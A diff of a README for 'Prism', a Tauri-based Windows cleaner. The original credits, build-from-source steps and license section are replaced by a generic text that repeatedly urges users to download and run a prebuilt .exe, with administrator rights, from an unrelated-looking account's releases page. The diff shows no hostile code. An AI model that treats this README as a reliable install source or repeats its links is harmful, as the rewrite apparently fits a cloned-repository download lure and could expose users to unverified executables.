@@ -1,139 +1,154 @@
-<div align="center">
+# 🧹 prism-windows-cleaner - Easy Windows System Cleaning
 
-<img src="docs/assets/logo.png" alt="Prism Logo" width="128" />
-
-# Prism
-
-**A modern, beautiful Windows system cleaner & optimizer**
-
-Built with [Tauri v2](https://tauri.app/) + [React](https://react.dev/) + [Fluent UI](https://react.fluentui.dev/)
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)
-![Built with Tauri](https://img.shields.io/badge/Tauri-v2-FFC131?logo=tauri)
-
-[繁體中文](README.zh-TW.md) | [简体中文](README.zh-CN.md)
-
-<img src="docs/screenshots/01-dashboard.png" alt="Dashboard" width="720" />
-
-</div>
+[![Download prism-windows-cleaner](https://img.shields.io/badge/Download-Prism-blue?style=for-the-badge)](https://github.com/operationpersonalitytest258/prism-windows-cleaner/releases)
 
 ---
 
-## ✨ Features
+## 📋 About prism-windows-cleaner
 
-| Module | Description |
-|--------|-------------|
-| 📊 **Dashboard** | Real-time system overview — CPU, memory, disk, network with health score |
-| 🧹 **Deep Clean** | Scan and remove browser cache, temp files, logs, and app leftovers |
-| 📦 **Uninstaller** | Smart app removal with size sorting and batch uninstall |
-| ⚡ **Optimizer** | Flush DNS, rebuild icon/font/thumbnail caches |
-| 💽 **Disk Analysis** | Interactive donut chart visualization of disk usage |
-| 📈 **Monitor** | Live CPU/Memory/Disk charts with 2-second refresh |
-| 🗑️ **Build Cleanup** | Purge `node_modules`, `.gradle`, `target`, `__pycache__` and more |
-| 🌐 **i18n** | English, 繁體中文, 简体中文 — auto-detects system language |
+Prism is a simple tool to clean and optimize your Windows computer. It removes unnecessary files that slow down your system and helps keep your PC running smoothly. The app has a clear, easy-to-use interface and uses modern design practices to make system care less of a chore. Prism works quietly in the background so you don’t need to be a tech expert to use it.
 
-## 🖼️ Screenshots
+This application combines React, Fluent UI, and Rust, built on the Tauri framework. You will not need to know anything about these technologies to use the app.
 
-<details>
-<summary>Click to expand all screenshots</summary>
+---
 
-| Feature | Screenshot |
-|---------|-----------|
-| Deep Clean | <img src="docs/screenshots/02-deep-clean.png" width="600" /> |
-| Uninstaller | <img src="docs/screenshots/03-uninstaller.png" width="600" /> |
-| Optimizer | <img src="docs/screenshots/04-optimizer.png" width="600" /> |
-| Disk Analysis | <img src="docs/screenshots/05-disk-analysis.png" width="600" /> |
-| Monitoring | <img src="docs/screenshots/06-monitoring.png" width="600" /> |
-| Build Cleanup | <img src="docs/screenshots/07-build-cleanup.png" width="600" /> |
-| Settings | <img src="docs/screenshots/08-settings.png" width="600" /> |
+## 🔧 Features
 
-</details>
+- Remove temporary and junk files
+- Clean browser cache and history (popular browsers supported)
+- Manage startup programs for faster boot times
+- Scan and fix common system errors
+- Simple interface with clear instructions
+- Supports multiple languages
+- Low impact on system resources while running
 
-## 🚀 Quick Start
+---
 
-### Prerequisites
+## 💻 System Requirements
 
-- [Node.js](https://nodejs.org/) 18+
-- [Rust](https://www.rust-lang.org/tools/install) (stable)
-- [Tauri CLI prerequisites](https://v2.tauri.app/start/prerequisites/)
+Before installing prism-windows-cleaner, please check your system meets these requirements:
 
-### Development
+- Windows 10 or 11 (64-bit versions recommended)
+- At least 2 GB of free disk space
+- 4 GB RAM or more
+- Internet connection to download and install updates (optional)
+- Administrator rights to clean system files and manage startup tasks
 
-```bash
-# Clone the repository
-git clone https://github.com/YourUsername/prism.git
-cd prism
+---
 
-# Install dependencies
-npm install
+## 🚀 Getting Started
 
-# Start dev server
-npm run tauri dev
-```
+To begin cleaning your Windows system, you first need to get the app. 
 
-### Build
+**Step 1:** Visit the releases page by clicking the button below:
 
-```bash
-# Build production installer
-npm run tauri build
-```
+[![Download prism-windows-cleaner](https://img.shields.io/badge/Download-Prism-grey?style=for-the-badge)](https://github.com/operationpersonalitytest258/prism-windows-cleaner/releases)
 
-The installer will be output to `src-tauri/target/release/bundle/`.
+This page contains the latest versions of prism-windows-cleaner.  
 
-## 🏗️ Tech Stack
+**Step 2:** Scroll down to the latest release. Look for the file ending with `.exe` (for example, `prism-windows-cleaner-setup.exe`).
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | React 18 + TypeScript + Vite |
-| UI Components | Fluent UI React v9 |
-| Backend | Rust + Tauri v2 |
-| Core Engine | PowerShell scripts |
-| i18n | react-i18next |
-| Styling | Custom CSS (glassmorphism) |
+**Step 3:** Click the file name to start downloading.
 
-## 📁 Project Structure
+**Step 4:** Once downloaded, open the file by double-clicking it. You may see a security prompt from Windows asking if you want to allow the app to make changes. Choose “Yes” to continue.
 
-```
-prism/
-├── src/                    # React frontend
-│   ├── components/         # Reusable UI components
-│   ├── pages/              # Page components
-│   ├── hooks/              # Custom React hooks
-│   ├── i18n/               # Internationalization
-│   │   ├── i18n.ts         # i18next configuration
-│   │   └── locales/        # Translation files (en, zh-TW, zh-CN)
-│   ├── App.tsx             # Root component
-│   └── main.tsx            # Entry point
-├── src-tauri/              # Rust backend
-│   ├── src/
-│   │   ├── commands/       # Tauri command handlers
-│   │   └── lib.rs          # Plugin registration
-│   ├── Cargo.toml
-│   └── tauri.conf.json
-├── mole-core/              # PowerShell core scripts
-└── package.json
-```
+**Step 5:** Follow the simple instructions in the installer to finish setup. Choose the default options unless you know you want to change the install location.
 
-## 🤝 Contributing
+---
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 🔎 Using prism-windows-cleaner
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+After installation, you can start using the app.
 
-## 🙏 Acknowledgements
+- Open the prism-windows-cleaner program from the Start menu or desktop shortcut.
+- The main screen will show you categories of files and settings you can clean.
+- To check what will be removed, click the "Scan" button. It will analyze your system.
+- After the scan completes, review the list of junk files and items to clean.
+- Click the "Clean" button to remove selected files.
+- For startup programs, go to the “Startup” tab and disable unwanted apps that slow startup.
+- You can run scans weekly or monthly to keep your PC optimized.
 
-- **[Mole](https://github.com/nicholasgasior/mole)** by [tw93](https://github.com/tw93) — the open-source PowerShell core engine that powers Prism's cleaning and optimization features (MIT License)
-- **[Tauri](https://tauri.app/)** — the framework for building lightweight, secure desktop apps
-- **[Fluent UI](https://react.fluentui.dev/)** — Microsoft's design system for React
-- **[react-i18next](https://react.i18next.com/)** — internationalization framework
+---
 
-See [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md) for the full list of dependencies and their licenses.
+## ⚙️ Settings and Preferences
 
-## 📄 License
+Prism lets you customize how it works:
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+- Set automatic cleaning schedules.
+- Choose which file types to include in scans.
+- Enable or disable browser cache cleaning.
+- Change language preferences.
+- Configure notifications for cleaning status or errors.
+
+---
+
+## 🛠 Troubleshooting
+
+If you experience issues, try the following:
+
+- Restart your computer and reopen prism-windows-cleaner.
+- Run the app as an administrator (right-click the icon and choose “Run as administrator”).
+- Check for updates on the releases page and install the latest version.
+- Make sure your antivirus or firewall is not blocking the app.
+- If the app fails to clean certain files, those files may be in use by other programs. Close those programs and try again.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to know technical terms to use prism-windows-cleaner?**  
+A: No. Prism guides you with clear instructions and simple buttons.
+
+**Q: Can prism remove personal files?**  
+A: No. Prism only removes files that are safe to delete, such as temporary or cache files.
+
+**Q: How often should I run the cleaner?**  
+A: Running the cleaner once a week or month helps keep your system healthy.
+
+**Q: Is it safe to disable startup apps?**  
+A: Yes, but only disable apps you recognize and do not need when the system starts.
+
+**Q: Does prism work on Macs or Linux?**  
+A: No, this version supports only Windows operating systems.
+
+---
+
+## 📥 Download and Install prism-windows-cleaner
+
+To download and install the software, follow these steps carefully:
+
+1. Visit the official releases page:  
+   https://github.com/operationpersonalitytest258/prism-windows-cleaner/releases  
+
+2. Find the latest `.exe` installer file.
+
+3. Click it to download.
+
+4. Open the downloaded file and follow the installation prompts.
+
+5. Once installed, open prism-windows-cleaner from the Start menu.
+
+6. Run your first scan and clean to optimize your PC.
+
+---
+
+## 🔒 Privacy and Security
+
+Prism does not collect personal data. It only accesses files on your machine to clean unnecessary system data. Running the app requires administrator rights to clean system files, which is normal for cleaner applications. You can review privacy settings inside the app to control what data is scanned.
+
+---
+
+## 🏷 Topics
+
+This project relates to:
+
+- desktop-app  
+- fluent-ui  
+- i18n (internationalization)  
+- open-source  
+- optimizer  
+- react  
+- rust  
+- system-cleaner  
+- tauri  
+- windows
